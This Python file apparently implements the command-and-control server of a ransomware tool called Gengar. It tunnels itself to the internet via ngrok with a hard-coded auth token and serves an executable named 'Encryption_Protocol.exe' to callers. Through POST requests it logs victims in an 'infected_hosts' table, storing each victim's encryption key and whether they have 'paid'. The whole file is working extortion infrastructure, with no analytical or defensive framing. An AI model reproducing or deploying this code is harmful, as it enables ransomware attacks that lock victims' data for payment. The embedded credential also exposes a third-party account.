from http.server import BaseHTTPRequestHandler, HTTPServer
from pyngrok import ngrok, conf
import sqlite3
import json
from os import curdir, sep

conf.get_default().auth_token = "1sZD68OeJd5hYhK5AXcZqadcfhH_78CE8wUxdYd14BULf6CJd"

"""
We must provide a JSON as the one it follows:

{
    'operation': 'insert'/'update'
    'id': as a unique identifier,
    'key': base64encoded_key,
    'date': datetime,
    'state': 'infected'/'paid'
}
"""
class DatabaseManager():
    def __init__(self, db_name="database.db"):
        self.db_name = db_name
        self.conn = None
        self.query_executor = None

        try:
            self.conn = sqlite3.connect(self.db_name)
            print("Successful connection to {}".format(self.db_name))

            self.query_executor = self.conn.cursor()
            self.query_executor.execute(
                """create table if not exists infected_hosts(id text primary key, key text not null, date text not null, state text not null);""")
        except sqlite3.Error as e:
            print(e)
            raise Exception("Connection failed!")

    def retry_connection(self, db_name="database.db"):
        try:
            self.conn = sqlite3.connect(db_name)
            print("Successful connection to {}".format(db_name))

            self.query_executor = self.conn.cursor()
        except sqlite3.Error as e:
            print(e)
            raise Exception("Connection failed!")

    def execute_query(self, query, data):
        try:
            self.query_executor.execute(query, data)
            self.conn.commit()

            print("Successful query!")
        except sqlite3.Error as e:
            print(e)
            raise Exception("Query failed!")


class GengarServer(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()

        if self.path == "/example/Encryption_Protocol.exe":
            with open(self.path[1:], 'rb') as file:
                self.wfile.write(file.read())

        else:
            self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))


    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        decoder = json.JSONDecoder()
        jsondata = decoder.decode(post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(
            self.path).encode('utf-8'))

        operation = jsondata['operation']
        database_manager = DatabaseManager()

        # do not check if some registries exists
        if operation == 'insert':
            database_manager.execute_query('''insert into infected_hosts(id, key, date, state) values(?,?,?,?);''', (jsondata['id'], jsondata['key'], jsondata['date'], jsondata['state']))
        elif operation == 'update':
            database_manager.execute_query('''update infected_hosts set state=? where id=?''',(jsondata['state'], jsondata['id']))
        else:
            print("Incorrect operation")


def run(server_class=HTTPServer, handler_class=GengarServer, address="localhost", port=8080):
    try:
        server_address = (address, port)
        httpd = server_class(server_address, handler_class)
        #print("Server started http://%s:%s" % (address, port))

        url = ngrok.connect(port)
        print("Server started on {}".format(url))

        httpd.serve_forever()
        ngrok_tunnel = ngrok.connect()
    except KeyboardInterrupt:
        httpd.__exit__()
        print("Server connection closed")
        exit()


if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
